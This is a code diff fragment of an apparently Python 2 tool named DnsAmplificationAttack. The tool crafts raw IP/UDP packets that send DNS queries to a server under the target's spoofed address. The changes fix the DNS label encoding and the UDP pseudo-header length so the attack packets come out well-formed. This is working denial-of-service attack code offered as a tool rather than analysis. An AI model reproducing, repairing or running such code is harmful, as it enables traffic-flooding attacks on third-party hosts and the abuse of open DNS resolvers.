@@ -60,15 +60,14 @@ def BuildIpHedaer(srcIP, DstIP):
 	return ipHeader
 
 def BuildDNSNameNotationFormat(dnsRecord):
-	dnsRecords = dnsRecord.split('.')
-	dnsValue = ''
-	for word in dnsRecords:
-		dnsValue += str(len(word)) + word
 
-	print dnsValue
+	dnsFormat = ""
+	for label in dnsRecord.split('.'):
+		length = len(label)
+		dnsFormat += pack('B', length) + label
 
-	dnsFormat = pack('!32s', dnsValue)
-	return dnsFormat
+	dnsFinalFormat = pack('!32s', dnsFormat)
+	return dnsFinalFormat
 
 
 def DnsAmplificationAttack(trgt_ip, trgt_p, dns_srv, dns_p, dns_record):
@@ -100,7 +99,7 @@ def DnsAmplificationAttack(trgt_ip, trgt_p, dns_srv, dns_p, dns_record):
 	pshdrDaddr = socket.inet_aton(dns_srv)
 	pshdrFiller = 0
 	pshdrProtocol = socket.IPPROTO_UDP
-	pshdrLen = len(udpHeader) + len(dnsHeader) + len(dnsFormat) + 1 + len(dnsQuery)
+	pshdrLen = len(udpHeader) + len(dnsHeader) + len(dnsFormat) + len(dnsQuery)
 	psHdr = pack('!4s4sBBH', pshdrSaddr, pshdrDaddr, pshdrFiller, pshdrProtocol, pshdrLen)
 
 	# Calculate the pseudo checksum for udp header
